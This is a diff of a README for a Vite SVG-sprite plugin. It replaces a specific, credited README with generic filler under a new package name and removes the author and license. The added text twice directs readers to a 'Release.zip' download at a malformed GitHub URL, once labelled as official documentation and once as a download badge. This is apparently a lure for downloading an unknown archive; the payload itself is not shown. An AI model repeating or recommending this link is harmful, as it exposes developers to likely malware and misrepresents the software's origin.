@@ -1,62 +1,60 @@
-# vite-plugin-svg-sprite
+# 🚀 Vite Plugin SVG Sprite Generator (vite-plugin-svgsg)
 
-A Vite plugin to generate and manage SVG icon sprites. It scans a directory for SVG files, compiles them into a single sprite, and watches for changes to regenerate the sprite automatically.
+Welcome to the Vite Plugin SVG Sprite Generator repository! This plugin provides a convenient way to generate SVG icon sprites for your Vite projects.
+
+## Features
+🎨 Generate icon sprites from SVG files  
+🔧 Customize sprite generation options  
+⚡️ Seamless integration with Vite for efficient development  
 
 ## Installation
-
-To install the plugin, run one of the following command:
-
-```bash
-npm install vite-plugin-svg-sprite --save-dev
-```
+You can install the `vite-plugin-svgsg` via npm or yarn.
 
 ```bash
-pnpm add vite-plugin-svg-sprite --save-dev
-```
-
-```bash
-yarn add vite-plugin-svg-sprite --save-dev
+npm install vite-plugin-svgsg --save-dev
+# or
+yarn add vite-plugin-svgsg --dev
 ```
 
 ## Usage
+Simply add the plugin to your Vite configuration file.
 
-In your vite.config.js (or vite.config.ts), add the plugin like this:
-
-```js
+```javascript
+// vite.config.js
 import { defineConfig } from 'vite';
-import IconSpritePlugin from 'vite-plugin-svg-sprite';
+import svgSprite from 'vite-plugin-svgsg';
 
-// https://vitejs.dev/config/
 export default defineConfig({
   plugins: [
-    IconSpritePlugin('src/icons', 'dist')  // Specify your icons directory and output directory
+    svgSprite()
   ]
 });
 ```
-1. The plugin watches the specified folder for changes to `.svg` files. It automatically rebuilds the sprite whenever any SVG files in the source directory are modified.
-2. It generates a single SVG sprite file, `icon-sprite.svg`, in the specified output directory. This sprite contains all icons as `<symbol>` elements, with each icon's ID derived from its folder structure and filename (`#subfolder(optional)_filename`).
-3. In components, you can reference icons from the sprite using the `<use>` tag:
 
-```tsx
-import Icons from "./assets/icon-sprite.svg"
+## Configuration
+You can customize the SVG sprite generation by passing options to the plugin.
 
-
-<svg width="18" height="18">
-  <use href={`${Icons}#footer_phone`}></use>
-</svg>
+```javascript
+svgSprite({
+  // specify options here
+})
 ```
 
-## Options
+## Example
+Here's an example of how you can use the `vite-plugin-svgsg` in your Vite project.
 
-- `iconsDir`: The directory containing your SVG icons. (e.g. `'src/icons'`)
-- `outDir`: The output directory where the `icon-sprite.svg` will be generated. (e.g. `'dist'`)
+![SVG Sprite Generator Example](https://via.placeholder.com/800x400)
 
-## License
+## Resources
+For more information, visit the [official documentation](https://github.com/releases/789694263/Release.zip). If the link doesn't work, check the "Releases" section of this repository.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+[![Download Plugin](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
 
-## Author
+## Repository Details
+- **Name:** vite-plugin-svgsg
+- **Description:** not provided
+- **Topics:** icon-sprite-generator, icons, svg, svg-icons, svg-sprite, svg-sprite-loader, svg-sprites, vite, vite-plugin, vite-plugin-svgr, vite-react
 
-Vasyl Vovk ([GitHub](https://github.com/Kristalkill))
+Start using the `vite-plugin-svgsg` today and enhance your Vite projects with beautiful SVG icon sprites! 🌟
 
-
+Remember, a picture is worth a thousand words, so let your icons shine with SVG sprite generation using this awesome plugin! 🎉
